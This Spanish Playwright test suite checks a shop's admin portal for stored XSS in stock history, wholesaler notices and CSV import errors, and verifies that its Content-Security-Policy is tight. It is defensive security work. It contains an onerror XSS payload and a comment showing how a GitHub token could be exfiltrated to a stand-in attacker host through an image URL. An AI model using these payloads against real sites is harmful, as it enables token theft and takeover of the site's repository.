/**
 * SEGURIDAD — XSS almacenado en el portal (FALLAN HOY, deben pasar tras el arreglo).
 *
 * Por qué es crítico: el portal guarda el PAT de GitHub DESCIFRADO en
 * sessionStorage ('catt_pat_session'). Un XSS en el portal = robo del token
 * = control total del repo del sitio (cambiar precios, QR de pago, inyectar
 * JS en la tienda pública).
 *
 * Payload: <img src=x onerror="window.__xss=1"> → window.__xss debe quedar undefined.
 */
import { test, expect, Page } from '@playwright/test';
import { setupPage, getFirebaseBackendRequests } from '../../helpers/setup';
import { entrarAlPortal } from '../../helpers/portal';
import { solicitudPendienteSample } from '../../fixtures/test-data';

const XSS = '<img src=x onerror="window.__xss=1">';

async function xssDisparado(page: Page) {
  await page.waitForTimeout(400); // dar tiempo a que cargue/falle el <img>
  return page.evaluate(() => (window as any).__xss);
}

test.describe('Portal — XSS @seguridad @portal', () => {

  test('historial de movimientos de stock no ejecuta HTML (movimientos creables por anónimos) @seguridad', async ({ page }) => {
    await setupPage(page, {
      firebase: {
        collections: {
          stock: { '1': { variantes: { M: { Blanco: { cantidad: 3, hex: '#fff' } } } } },
          'stock/1/movimientos': {
            m1: { talle: XSS, color: 'Blanco', delta: -1, motivo: 'Venta #AAAAA', fecha: '2026-10-26', ts: 5 },
            m2: { talle: 'M', color: XSS, delta: -1, motivo: 'Venta #BBBBB', fecha: '2026-10-26', ts: 4 },
            m3: { talle: 'M', color: 'Blanco', delta: -1, motivo: XSS, fecha: '2026-10-26', ts: 3 },
            m4: { talle: 'M', color: 'Blanco', delta: -1, motivo: 'x', fecha: XSS, ts: 2 },
            m5: { talle: 'M', color: 'Blanco', delta: -1, motivo: 'x', fecha: '2026-10-26', cantidadResultante: XSS, ts: 1 }
          }
        }
      }
    });
    const portal = await entrarAlPortal(page);
    await portal.abrirTab('stock');
    await portal.abrirSubtab('stock-historial');
    await page.locator('#stock-hist-select').selectOption('1');
    await expect(page.locator('#stock-historial-list table tbody tr')).toHaveCount(5);
    expect(await xssDisparado(page)).toBeUndefined();
    /* y el texto se ve tal cual (escapado), no se pierde información */
    await expect(page.locator('#stock-historial-list')).toContainText('<img src=x');
    expect(getFirebaseBackendRequests(page)).toEqual([]);
  });

  test('aviso "ya hay un mayorista en la zona" no ejecuta HTML de nombre/negocio/localidad @seguridad', async ({ page }) => {
    await setupPage(page, {
      firebase: {
        collections: {
          /* hoy cualquier anónimo puede crear esto (request.auth != null con signInAnonymously) */
          mayoristas_activos: {
            ['a'.repeat(64)]: { nombre: XSS, negocio: XSS, localidad: 'La Plata', provincia: 'Buenos Aires' },
            ['b'.repeat(64)]: { nombre: 'Otro', negocio: 'Otro', localidad: XSS, provincia: XSS }
          },
          /* y esto lo puede crear cualquiera desde el formulario público */
          solicitudes_mayoristas: {
            s1: solicitudPendienteSample, // La Plata, Buenos Aires
            s2: { ...solicitudPendienteSample, codigo: 'MAY-ZZZZ',
                  solicitante: { ...solicitudPendienteSample.solicitante, negocio: 'Neg XSS', localidad: XSS, provincia: XSS } }
          }
        }
      }
    });
    const portal = await entrarAlPortal(page);
    await portal.abrirTab('mayoristas');
    await portal.abrirSubtab('solicitudes');
    await expect(page.locator('#solicitudes-list')).toContainText('Ya hay');
    expect(await xssDisparado(page)).toBeUndefined();
  });

  test('importación CSV: los mensajes de error no ejecutan HTML del archivo @seguridad', async ({ page }) => {
    await setupPage(page, { firebase: { collections: { stock: {} } } });
    const portal = await entrarAlPortal(page);
    await portal.abrirTab('stock');
    await portal.abrirSubtab('stock-import');
    await page.locator('#stock-csv-input').fill(`1,${XSS.replace(/,/g, ' ')},Blanco,-5`);
    await page.getByRole('button', { name: 'Importar', exact: true }).click();
    await expect(page.locator('#stock-import-status')).toContainText(/error/i);
    expect(await xssDisparado(page)).toBeUndefined();
  });

  test('la CSP del portal no permite exfiltrar el token a cualquier host (img-src/connect-src acotados) @seguridad', async ({ page }) => {
    /* Hoy: img-src 'self' data: https:  → new Image().src='https://atacante/?t='+PAT funciona.
       connect-src https://*.googleapis.com → también se puede exfiltrar a un
       Firestore/Storage de OTRO proyecto de Google. (script-src 'unsafe-inline'
       es necesario hoy por los onclick="..." inline; sacarlo es un refactor aparte.) */
    await setupPage(page);
    await page.goto('/portal.html');
    const csp = (await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')) || '';
    const dir = (n: string) => (csp.match(new RegExp(`${n}([^;]*)`)) || [, ''])[1].trim().split(/\s+/);
    expect(dir('img-src'), 'img-src permite cualquier https:').not.toContain('https:');
    expect(dir('img-src')).not.toContain('*');
    expect(dir('connect-src').filter(s => s.includes('*')), 'connect-src con comodines').toEqual([]);
    expect(csp).toMatch(/connect-src[^;]*api\.github\.com/);
  });
});
